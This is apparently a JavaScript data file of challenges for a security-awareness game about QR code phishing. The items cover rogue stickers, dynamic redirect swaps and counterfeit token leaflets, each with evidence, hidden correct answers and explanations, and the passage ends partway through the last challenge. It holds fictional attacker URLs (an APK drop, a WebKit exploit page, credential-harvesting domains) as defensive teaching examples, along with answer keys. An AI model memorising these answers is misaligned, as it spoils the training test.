import { TOPICS } from '../../utils/constants.js';

/**
 * Authoritative Challenge Definitions for ROOM 03: THE SCANNER (QR Security & Quishing).
 * Contains 1 Beginner, 3 Intermediate, and 10 Expert challenges.
 * Private validation fields (correctActionId, privateIndicators, explanation) are kept strictly server-side.
 */
export const ROOM_03_CHALLENGES = [
  // ==========================================
  // BEGINNER (1 Challenge)
  // ==========================================
  {
    challengeId: 'ch-qr-01',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'beginner',
    scenarioType: 'malicious',
    prompt: 'Inspect the optical sensor beacon destination before permitting facility equipment to sync.',
    narrative: 'Optical telemetry nodes in Sector 03 have been pasted over with unauthorized QR codes.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://bit.ly/3xSecFacilitySync',
      redirectChain: [
        { hop: 1, url: 'https://bit.ly/3xSecFacilitySync', statusCode: 301 },
        { hop: 2, url: 'http://malware-drop.ru/beacon.apk', statusCode: 200, contentType: 'application/vnd.android.package-archive' },
      ],
      physicalContext: 'Adhesive paper sticker pasted over official laser-etched stainless steel plaque',
      visualAnomaly: 'Edges peeling slightly, misaligned facility emblem, non-standard system font',
      physicalInspectionNotes: 'Visual tampering detected: An adhesive paper sticker has been intentionally placed directly over the official laser-etched stainless steel serial plaque.',
      redirectInspectionNotes: 'Critical discovery: Shortened Bitly link resolves through an HTTP 301 redirect to an unencrypted foreign APK binary (malware-drop.ru/beacon.apk).',
      payloadReputationNotes: 'Domain reputation: 98/100 Threat Index (Known C2). Target is an arbitrary remote code execution Android application package (.APK).',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_SYNC_EQUIPMENT', label: 'Scan & Authorize Equipment Firmware Sync', variant: 'danger' },
      { actionId: 'ACTION_OPEN_SHORTLINK_BROWSER', label: 'Open Shortened URL in Workstation Browser', variant: 'warning' },
      { actionId: 'ACTION_PEEL_AND_REPORT', label: 'Flag Physical Quishing Sticker & Sever Node', variant: 'primary' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_PEEL_AND_REPORT',
    privateIndicators: [
      'physical_sticker_overlay: adhesive sticker covers official laser-etched serial plate',
      'url_shortener_obfuscation: bit.ly link masks destination hostname',
      'unauthorized_apk_executable: target download is an unverified binary (.apk)',
    ],
    scoringMetadata: {
      basePoints: 500,
      targetTimeSeconds: 35,
    },
    consequenceData: {
      onCorrect: 'Quishing attack neutralized! Malicious physical sticker identified, rogue APK download prevented, and node secured.',
      onIncorrect: 'Malicious payload executed! Scanning the rogue QR code triggered an unauthorized APK download to facility equipment.',
    },
    fivePartExplanation: {
      whatHappened: 'An adversary pasted a rogue QR code sticker over an official scanner plaque to trick personnel into downloading a Trojanized APK.',
      evidence: 'The physical sticker was peeling over the metal plaque, and tracing the shortened Bitly link revealed an unencrypted redirect to "malware-drop.ru/beacon.apk".',
      whyDangerous: 'QR codes hide the true destination URL. Scanning unverified codes can trigger drive-by downloads or credential phishing portals.',
      correctAction: 'Never scan unexpected or physically overlaid QR codes. Use a safe QR reader that displays full destination URLs, or navigate directly via official portals.',
      securityTip: 'Treat QR codes like unverified hyperlinks. Check for physical tampering and always verify the final expanded domain before taking action.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Inspect the physical surface—notice whether the QR code is an adhesive label pasted over an official plate.',
      'Use the redirect tracer to reveal where the shortened URL actually leads before authorizing any connection.',
    ],
  },

  // ==========================================
  // INTERMEDIATE (3 Challenges)
  // ==========================================
  {
    challengeId: 'ch-qr-int-01',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'intermediate',
    scenarioType: 'legitimate',
    prompt: 'Inspect this official conference room guest Wi-Fi connection plaque.',
    narrative: 'A laser-engraved acrylic plaque mounted on the Sector 03 conference room wall provides guest Wi-Fi connection credentials.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'WIFI:S:Facility-Guest-WPA3;T:WPA;P:WelcomeGuest2026!;H:false;;',
      redirectChain: [
        { hop: 1, url: 'wifi://Facility-Guest-WPA3', statusCode: 200, contentType: 'application/x-wifi-config' },
      ],
      physicalContext: 'Laser-engraved brushed aluminum plaque permanently affixed to conference room wall with tamper-resistant screws',
      visualAnomaly: 'Official facility crest engraved cleanly; zero peeling, zero overlays, surface completely smooth',
      physicalInspectionNotes: 'Permanent hardware fixture installed during facility construction. No adhesive sticker or tampering detected.',
      redirectInspectionNotes: 'Payload is standard offline Wi-Fi connection URI matching the broadcasted corporate guest SSID (WPA3-SAE encrypted).',
      payloadReputationNotes: 'Direct wireless configuration; no external HTTP requests, no profile downloads, zero web traffic initiated.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_CONNECT_OFFICIAL_GUEST_WIFI', label: 'Scan & Connect to Authorized Facility Guest Wi-Fi Network', variant: 'primary' },
      { actionId: 'ACTION_PRY_ALUMINUM_PLAQUE', label: 'Pry Aluminum Plaque off Wall Believing It Is an Attack', variant: 'danger' },
      { actionId: 'ACTION_REPORT_ALL_GUEST_WIFI_SUSPICIOUS', label: 'File Security Incident Declaring All Wireless QR Codes Prohibited', variant: 'warning' },
      { actionId: 'ACTION_CHANGE_SSID_PASSWORD', label: 'Attempt to Reconfigure Facility Access Point Passwords', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_CONNECT_OFFICIAL_GUEST_WIFI',
    privateIndicators: [
      'laser_engraved_fixture: permanent wall installation with tamper-resistant screws',
      'local_wifi_schema: standard offline WIFI: configuration payload',
      'wpa3_guest_network: isolated guest VLAN with zero enterprise network access',
    ],
    scoringMetadata: {
      basePoints: 600,
      targetTimeSeconds: 40,
    },
    consequenceData: {
      onCorrect: 'Guest Wi-Fi connected! Validated authentic permanent fixture and secure WPA3 guest isolation network.',
      onIncorrect: 'False-positive disruption! Vandalizing permanent facility fixtures and filing false alarms wastes security resources and interrupts executive meetings.',
    },
    fivePartExplanation: {
      whatHappened: 'A visitor inspected a permanent, official laser-engraved conference room Wi-Fi plaque.',
      evidence: 'The plaque is permanently mounted with tamper screws, and the payload is a standard local "WIFI:S:..." string with zero web redirects.',
      whyDangerous: 'Falsely treating authentic operational infrastructure as malicious causes unnecessary panic, equipment damage, and workflow disruption.',
      correctAction: 'Inspect physical mounting and payload structure; confirm it is a direct local configuration matching official guest SSIDs.',
      securityTip: 'Legitimate Wi-Fi QR codes use standard WIFI schema and configure credentials locally without requiring browser navigation or profile installation.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Inspect the physical surface: Is this an adhesive sticker or a permanent metal plaque bolted to the wall?',
      'Check the scanned payload: Does it connect directly via Wi-Fi schema, or route through an external internet link?',
    ],
  },

  {
    challengeId: 'ch-qr-int-02',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'intermediate',
    scenarioType: 'malicious',
    prompt: 'Examine this public EV charging station QR code and decide how to authorize station power.',
    narrative: 'A corporate fleet charging terminal has a sticker prompting drivers to scan a QR code to initiate high-speed charging.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://tinyurl.com/FleetChargeFast2026',
      redirectChain: [
        { hop: 1, url: 'https://tinyurl.com/FleetChargeFast2026', statusCode: 301 },
        { hop: 2, url: 'https://fast-charge-pay.top/checkout?station_id=402', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Vinyl decal sticker placed directly over the station\'s built-in RFID tap reader',
      visualAnomaly: 'The official digital screen says "Insert Fleet Card or Tap Badge", but the sticker says "TAP BROKEN — SCAN QR TO PAY"',
      physicalInspectionNotes: 'Decal is covering the legitimate contactless RFID card reader. The official screen makes no mention of QR payments.',
      redirectInspectionNotes: 'Resolves through TinyURL to an untrusted .top top-level domain requesting corporate credit card details.',
      payloadReputationNotes: 'Domain fast-charge-pay.top was registered 48 hours ago in an anonymous offshore registrar.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_REPORT_PHYSICAL_TAMPER_USE_RFID', label: 'Report Physical Tamper to Security, Remove Decal, and Pay Exclusively via Official Fleet Card', variant: 'primary' },
      { actionId: 'ACTION_ENTER_CREDIT_CARD_PORTAL', label: 'Enter Corporate Credit Card on fast-charge-pay.top to Keep Vehicle Charged', variant: 'danger' },
      { actionId: 'ACTION_USE_PERSONAL_PHONE_BROWSER', label: 'Open Shortlink in Private Browser Window to Bypass Work Filters', variant: 'warning' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_REPORT_PHYSICAL_TAMPER_USE_RFID',
    privateIndicators: [
      'rfid_overlay_scam: sticker placed over working contactless terminal',
      'fraudulent_payment_portal: fast-charge-pay.top harvesting credit cards',
      'social_decal_trick: TAP BROKEN pretext to force QR scan',
    ],
    scoringMetadata: {
      basePoints: 600,
      targetTimeSeconds: 40,
    },
    consequenceData: {
      onCorrect: 'Charging station fraud neutralized! Fraudulent decal removed and facilities team inspected all perimeter charging posts.',
      onIncorrect: 'Corporate credit card stolen! Fraudulent payment portal charged $1,500 in unauthorized international transactions.',
    },
    fivePartExplanation: {
      whatHappened: 'Criminals pasted a fake payment QR code sticker over the legitimate RFID reader of a corporate vehicle charging station.',
      evidence: 'The decal claimed the tap reader was broken, routing drivers to newly registered "fast-charge-pay.top" to harvest card numbers.',
      whyDangerous: 'Physical quishing stickers on public infrastructure (parking meters, charging kiosks) capture thousands of card details before detection.',
      correctAction: 'Never scan payment QR stickers affixed to payment terminals; verify terminal status and report physical tampering immediately.',
      securityTip: 'Inspect public payment terminals for loose overlays, peeling decals, and discrepancies between physical stickers and screen instructions.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Compare what the charging station\'s built-in digital screen says with what the physical sticker claims.',
      'Check the destination domain: Does fast-charge-pay.top match the official utility fleet provider?',
    ],
  },

  {
    challengeId: 'ch-qr-int-03',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'intermediate',
    scenarioType: 'ambiguous',
    prompt: 'Investigate this visitor badge QR code linking to digital conference presentation slides.',
    narrative: 'A keynote presenter at an industry symposium invites the audience to scan a badge QR code to download the technical presentation PDF.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://slides.global-cyber-summit.com/session-302.pdf',
      redirectChain: [
        { hop: 1, url: 'https://slides.global-cyber-summit.com/session-302.pdf', statusCode: 200, contentType: 'application/pdf' },
      ],
      physicalContext: 'Printed on official glossy cardstock conference lanyard badge distributed at authorized registration desk',
      visualAnomaly: 'Badge card is authentic, but destination is an external third-party domain hosting a direct document file',
      physicalInspectionNotes: 'Cardstock verified by badge verification scanner at registration desk; no physical sticker overlay.',
      redirectInspectionNotes: 'Direct HTTPS link to an active PDF file. Domain has valid TLS cert issued by DigiCert to Global Cyber Summit LLC.',
      payloadReputationNotes: 'Domain registered 3 years ago; clean threat telemetry across VirusTotal and Talos.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_INSPECT_URL_PROCEED_SANDBOX', label: 'Verify Domain TLS Certificate, Expand Target, and Open PDF in Isolated Sandbox Viewer', variant: 'primary' },
      { actionId: 'ACTION_CONFISCATE_PRESENTER_BADGE', label: 'Accuse Speaker of Quishing and Confiscate Badge Immediately', variant: 'danger' },
      { actionId: 'ACTION_DOWNLOAD_PDF_EXECUTE_MACROS', label: 'Download PDF and Enable Embedded JavaScript/Macros in Adobe Reader', variant: 'warning' },
      { actionId: 'ACTION_BLOCK_ALL_CONFERENCE_DOMAINS', label: 'Submit Firewall Request to Block All Conference Domains Enterprise-Wide', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_INSPECT_URL_PROCEED_SANDBOX',
    privateIndicators: [
      'legitimate_conference_host: established 3-year domain with valid DigiCert TLS',
      'isolated_inspection_best_practice: external PDFs should be rendered in sandbox',
      'official_badge_channel: printed directly onto registration desk cardstock',
    ],
    scoringMetadata: {
      basePoints: 600,
      targetTimeSeconds: 40,
    },
    consequenceData: {
      onCorrect: 'Investigation successful! Certificate verified, target validated as benign PDF presentation, and isolated viewer prevented zero-day risks.',
      onIncorrect: 'Incident mismanaged! Either false-positive escalation disrupted a live conference keynote, or unvetted execution exposed the endpoint.',
    },
    fivePartExplanation: {
      whatHappened: 'A speaker provided a QR code to download keynote slides on an external domain.',
      evidence: 'Domain is legitimate and established (3-year registration, valid DigiCert EV TLS), but any external file requires basic isolation hygiene.',
      whyDangerous: 'Blindly opening PDFs can trigger PDF reader zero-days, while blindly confiscating authentic speaker badges creates an embarrassing false alarm.',
      correctAction: 'Investigate domain registration and certificate legitimacy, then inspect or render the document inside an isolated sandbox.',
      securityTip: 'Use browser isolation or cloud document viewers when reviewing files from third-party conference materials.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Look at the domain and TLS certificate: Is it an established conference domain or an anonymous temporary drop?',
      'How can you safely view a third-party PDF file without exposing your endpoint to potential document exploits?',
    ],
  },

  // ==========================================
  // EXPERT (10 Challenges)
  // ==========================================
  {
    challengeId: 'ch-qr-exp-01',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'legitimate',
    prompt: 'Evaluate an authenticator onboarding QR code rendered on the corporate Identity & Access Management self-service portal.',
    narrative: 'During scheduled multi-factor authentication setup, the authenticated intranet portal displays a QR code to enroll a smartphone authenticator app.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'otpauth://totp/Facility-Corp:j.cadet@facility-corp.com?secret=HXDMVJECJJWSRB3HWIZR4IFUGFTT6QZ2&issuer=Facility-Corp-SSO&algorithm=SHA256&digits=6&period=30',
      redirectChain: [
        { hop: 1, url: 'otpauth://totp/...', statusCode: 200, contentType: 'application/octet-stream' },
      ],
      physicalContext: 'Rendered dynamically on high-resolution workstation monitor inside authenticated corporate portal (auth.facility-corp.com/mfa-setup)',
      visualAnomaly: 'Portal active session is authenticated with corporate smartcard; URL bar shows EV TLS lock; issuer matches enterprise identity provider',
      physicalInspectionNotes: 'Displayed within legitimate authenticated browser session after hardware PIN verification; zero email or physical flyer involvement.',
      redirectInspectionNotes: 'otpauth URI matches RFC 6238 TOTP specifications with SHA-256 HMAC and exact corporate issuer: "Facility-Corp-SSO".',
      payloadReputationNotes: 'Internal corporate identity endpoint; secret generated ephemeral in memory on the enterprise IdP.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_SCAN_ENROLL_AUTHENTICATOR', label: 'Verify Portal HTTPS Origin & Enroll OTP Token in Enterprise Authenticator App', variant: 'primary' },
      { actionId: 'ACTION_REPORT_AUTHENTICATOR_QUISHING', label: 'Report Intranet Portal as Malicious Quishing Site and Disable Cadet Account', variant: 'danger' },
      { actionId: 'ACTION_POST_SECRET_TO_SLACK', label: 'Copy Secret String and Paste into Team Slack Channel to Back It Up', variant: 'warning' },
      { actionId: 'ACTION_REJECT_MFA_USE_PASSWORD_ONLY', label: 'Reject Authenticator Enrollment and Request Password-Only Authentication', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_SCAN_ENROLL_AUTHENTICATOR',
    privateIndicators: [
      'authenticated_session_origin: rendered inside smartcard-authenticated portal session',
      'rfc_totp_compliance: SHA-256 HMAC with corporate issuer string',
      'zero_external_exposure: internal IdP ephemeral secret generation',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Authenticator registered! Origin verified, RFC-compliant TOTP token enrolled, and corporate account secured with multi-factor authentication.',
      onIncorrect: 'False-positive lockout! Reporting the official corporate MFA portal as a quishing attack blocked onboarding and locked the user account.',
    },
    fivePartExplanation: {
      whatHappened: 'A user was onboarding multi-factor authentication through the official, authenticated enterprise identity portal.',
      evidence: 'The QR was generated within an active, smartcard-authenticated HTTPS session on auth.facility-corp.com, and the issuer matched enterprise SSO.',
      whyDangerous: 'Misidentifying standard corporate MFA enrollment as an attack halts onboarding, increases helpdesk tickets, and delays security compliance.',
      correctAction: 'Confirm the browser URL, EV certificate, and authenticated session state before enrolling the TOTP token.',
      securityTip: 'Legitimate MFA enrollment QR codes are displayed inside authenticated web sessions, never delivered via unsolicited emails or random flyers.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Look at the browser context: Is this being rendered inside an active authenticated corporate session (auth.facility-corp.com)?',
      'Does the issuer in the otpauth string match the corporate Single Sign-On identity provider?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-02',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'malicious',
    prompt: 'Examine this time-delayed dynamic QR redirect swap attack on a facility cafeteria terminal.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://dynamic-qr-hub.io/v/cafeteria-menu-08',
      redirectChain: [
        { hop: 1, url: 'https://dynamic-qr-hub.io/v/cafeteria-menu-08', statusCode: 302 },
        { hop: 2, url: 'https://zeroday-browser-exploit.cc/stage2/webkit_rce.html', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Plastic stand on facility cafeteria table scanned by hundreds of employees daily',
      visualAnomaly: 'Morning security inspection confirmed the QR pointed to a benign PDF lunch menu; however, backend redirection was altered at 12:05 PM',
      physicalInspectionNotes: 'The physical QR code is unchanged, but the dynamic redirect provider allows backend URL updates in real time.',
      redirectInspectionNotes: 'Hop 2 resolves to an exploit kit landing page delivering a WebKit / V8 browser heap overflow zero-day.',
      payloadReputationNotes: 'zeroday-browser-exploit.cc is hosted on bulletproof Russian servers active in browser drive-by attacks.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_SINKHOLE_DYNAMIC_QR_PURGE', label: 'Sinkhole dynamic-qr-hub.io at Boundary DNS, Purge Table Stands, and Scan Devices That Scanned After 12:05 PM', variant: 'primary' },
      { actionId: 'ACTION_RELOAD_MENU_BROWSER', label: 'Reload Page Several Times to See If the Lunch Menu Comes Back', variant: 'danger' },
      { actionId: 'ACTION_IGNORE_SINCE_PASSED_MORNING_SCAN', label: 'Ignore Alert Because the QR Code Passed Physical Morning Inspection', variant: 'warning' },
      { actionId: 'ACTION_EMAIL_CAFETERIA_STAFF', label: 'Email Cafeteria Staff Complaining the Menu Is Down', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_SINKHOLE_DYNAMIC_QR_PURGE',
    privateIndicators: [
      'dynamic_redirect_swap: backend target switched after morning safety inspection',
      'browser_exploit_kit: WebKit RCE delivered to cafeteria scanners',
      'time_based_evasion: clean during scan tests; malicious during lunch hour rush',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Dynamic redirect swap contained! Malicious C2 sinkholed across enterprise DNS and vulnerable mobile devices quarantined.',
      onIncorrect: 'Drive-by exploit executed! Workstation browser rendered webkit_rce.html, establishing memory-resident shell on cadet tablet.',
    },
    fivePartExplanation: {
      whatHappened: 'Attackers deployed a dynamic QR code that originally showed a clean menu, then swapped the backend destination to a browser exploit.',
      evidence: 'Hop 1 redirected to "zeroday-browser-exploit.cc" delivering a weaponized WebKit heap spray during peak lunch hours.',
      whyDangerous: 'Dynamic QR codes decouple the printed graphic from the target URL; static security reviews become irrelevant if the server alters the target.',
      correctAction: 'Sinkhole the dynamic QR domain, confiscate the stands, and audit device logs for all scans occurring after the redirect swap.',
      securityTip: 'Treat all dynamic QR services with zero trust; enforce endpoint browser isolation and real-time URL inspection on every scan.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'What is a "dynamic QR code", and how does it differ from a static QR code?',
      'Even if a QR code was verified clean this morning, what can the owner of the redirect server change at any time?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-03',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'legitimate',
    prompt: 'Validate a data center server blade inventory asset tracking Micro-QR code.',
    narrative: 'During a data center physical audit, an engineer scans a Micro-QR code on a high-density server blade.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'asset://facility-dc/blade-042?sn=CN-0A192B-71280-482-0192&sku=SVR-BLD-V4',
      redirectChain: [
        { hop: 1, url: 'asset://facility-dc/blade-042?...', statusCode: 200, contentType: 'text/plain' },
      ],
      physicalContext: 'Laser-etched Micro-QR directly on the factory aluminum server blade chassis bezel',
      visualAnomaly: 'Precision factory laser engraving; matches Dell/HPE OEM hardware serial number stamps',
      physicalInspectionNotes: 'Laser engraving is permanent and flush with the metal chassis. No stickers, decals, or physical overlays.',
      redirectInspectionNotes: 'Payload uses custom proprietary "asset://" URI scheme containing hardware serial and SKU; zero network or web calls.',
      payloadReputationNotes: 'Static machine-readable inventory data parsed locally by Data Center Infrastructure Management (DCIM) handheld scanner.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_SCAN_INVENTORY_ASSET', label: 'Validate Laser Etching & Ingest Serial Data into Data Center Inventory System (DCIM)', variant: 'primary' },
      { actionId: 'ACTION_SCRATCH_OFF_ETCHING', label: 'Scratch off Laser Etching with a Screwdriver to Prevent Firmware Compromise', variant: 'danger' },
      { actionId: 'ACTION_OPEN_ASSET_IN_CHROME', label: 'Force Chrome Browser to Treat "asset://" as an HTTP Website and Download Executables', variant: 'warning' },
      { actionId: 'ACTION_DISCONNECT_BLADE_POWER', label: 'Pull Server Blade Power Cords Believing the Micro-QR Is a Hardware Trojan', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_SCAN_INVENTORY_ASSET',
    privateIndicators: [
      'oem_laser_engraving: permanent factory etching on metal chassis bezel',
      'local_asset_schema: non-routable asset:// identifier for offline DCIM tracking',
      'zero_network_egress: zero HTTP/DNS queries generated by serial scan',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Asset validated! Hardware serial and configuration ingested into DCIM database without incident.',
      onIncorrect: 'Hardware damage and service disruption! Defacing server chassis and pulling power cords caused unscheduled cluster downtime.',
    },
    fivePartExplanation: {
      whatHappened: 'An engineer scanned an authentic factory laser-etched inventory Micro-QR code on a server blade.',
      evidence: 'The QR is laser-etched onto the metal chassis and encodes a local "asset://" serial string without external network URLs.',
      whyDangerous: 'Destroying legitimate hardware serial codes impairs warranty service and asset tracking, while pulling power triggers cluster failover outages.',
      correctAction: 'Confirm the physical medium (laser-etched OEM metal) and data format (static asset string), then proceed with DCIM inventory logging.',
      securityTip: 'Differentiate between paper/adhesive sticker overlays and permanent OEM laser-etched asset identifiers.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Look at the physical medium: Is this a peeling paper sticker or laser-etched directly into the server chassis?',
      'Check the URI scheme "asset://": Does it contact an external internet server, or is it parsed locally by inventory software?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-04',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'malicious',
    prompt: 'Detect this supply chain compromise involving a counterfeit hardware security key initialization leaflet.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://yubico.com.token-setup-utility.io/initialize?serial=YUBI-99214',
      redirectChain: [
        { hop: 1, url: 'https://yubico.com.token-setup-utility.io/initialize', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Glossy printed card inside the sealed cardboard box of a newly delivered hardware FIDO2 token',
      visualAnomaly: 'Card says "MANDATORY INITIALIZATION: Scan QR to Register Hardware Security Token Before First Use"',
      physicalInspectionNotes: 'Genuine hardware tokens do not ship with QR code leaflets requiring cloud registration on third-party domains.',
      redirectInspectionNotes: 'Destination points to token-setup-utility.io, which prompts the user to input a "master recovery passphrase".',
      payloadReputationNotes: 'Domain token-setup-utility.io is registered through an anonymous registrar with active credential harvesting portals.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_QUARANTINE_SHIPMENT_SUPPLY_CHAIN', label: 'Quarantine Entire Hardware Token Shipment, Report Supply Chain Tamper to Vendor, and Validate Keys Only via Official Software', variant: 'primary' },
      { actionId: 'ACTION_SCAN_AND_INITIALIZE_TOKEN', label: 'Follow Printed Instructions and Scan QR to Ensure Token Functions Properly', variant: 'danger' },
      { actionId: 'ACTION_DISTRIBUTE_TOKENS_ANYWAY', label: 'Distribute Tokens to Staff but Tell Them to Throw Away the Paper Leaflet', variant: 'warning' },
      { actionId: 'ACTION_REPLY_ORDER_CONFIRMATION', label: 'Reply to the Delivery Confirmation Email Asking If Leaflet Is Real', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_QUARANTINE_SHIPMENT_SUPPLY_CHAIN',
    privateIndicators: [
      'supply_chain_interception: counterfeit printed leaflet inserted into hardware packaging',
      'lookalike_domain: yubico.com.token-setup-utility.io',
      'recovery_phrase_harvesting: prompts user for recovery secrets',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Supply chain interdiction uncovered! Hardware shipment quarantined and manufacturer launched tamper investigation.',
      onIncorrect: 'Hardware security bypassed! Users inputted recovery credentials into the phishing portal, compromising all accounts.',
    },
    fivePartExplanation: {
      whatHappened: 'Attackers intercepted a shipment of hardware security keys and inserted counterfeit leaflets containing phishing QR codes.',
      evidence: 'The leaflet linked to "yubico.com.token-setup-utility.io", an attacker domain designed to harvest master recovery passphrases.',
      whyDangerous: 'Users implicitly trust physical packaging. Entering recovery keys gives attackers permanent access to hardware-backed accounts.',
      correctAction: 'Quarantine the entire batch of hardware tokens, notify the vendor of supply chain tampering, and verify firmware integrity.',
      securityTip: 'Hardware tokens are configured exclusively through official desktop applications or native OS settings, never third-party QR codes.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Do genuine hardware security tokens (like YubiKeys) require scanning a QR code on an external website to activate?',
      'Look closely at the domain name: yubico.com.token-setup-utility.io.',
    ],
  },

  {
    challengeId: 'ch-qr-exp-05',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'ambiguous',
    prompt: 'Investigate an automated parking validation QR code at a facility commercial garage entrance.',
    narrative: 'A parking terminal displays a QR code for visitors and staff to validate daily parking fees via an external vendor.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://metro-parking-validation.net/validate?facility_id=SEC03&lane=2',
      redirectChain: [
        { hop: 1, url: 'https://metro-parking-validation.net/validate?facility_id=SEC03&lane=2', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Dynamic LCD digital screen integrated into the commercial gate barrier console',
      visualAnomaly: 'Digital display changes QR code session ID every 60 seconds; hosted on a third-party vendor domain',
      physicalInspectionNotes: 'QR is rendered on an embedded digital monitor inside a locked metal housing; physical tampering is ruled out.',
      redirectInspectionNotes: 'Resolves directly via HTTPS to an external commercial parking vendor platform. SSL certificate is valid and issued by Sectigo.',
      payloadReputationNotes: 'Domain registered in 2019, operational for municipal parking validation. Requests location permission upon load.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_VERIFY_PARKING_VENDOR_PERMISSIONS', label: 'Verify Vendor Contract with Facilities & Validate Parking Without Granting Unnecessary Device Permissions', variant: 'primary' },
      { actionId: 'ACTION_SMASH_GATE_DISPLAY', label: 'Smash the LCD Screen to Prevent Staff from Scanning Third-Party Domains', variant: 'danger' },
      { actionId: 'ACTION_GRANT_FULL_DEVICE_ADMIN_PARKING', label: 'Grant Full Device Management & Background Location to the Parking Web Application', variant: 'warning' },
      { actionId: 'ACTION_IGNORE_GATE_BLOCK_TRAFFIC', label: 'Park in Front of the Gate and Leave Vehicle Unattended Blocking Inbound Traffic', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_VERIFY_PARKING_VENDOR_PERMISSIONS',
    privateIndicators: [
      'authorized_third_party_vendor: legitimate parking contractor with 5-year operating history',
      'tamper_resistant_lcd: rendered inside sealed gate housing',
      'least_privilege_permissions: location/device access must be restricted to minimal requirements',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Vendor integration validated! Confirmed legitimate commercial partnership and completed validation safely without over-permissioning.',
      onIncorrect: 'Mismanaged security posture! Either physical destruction damaged facility property, or granting excess permissions compromised device privacy.',
    },
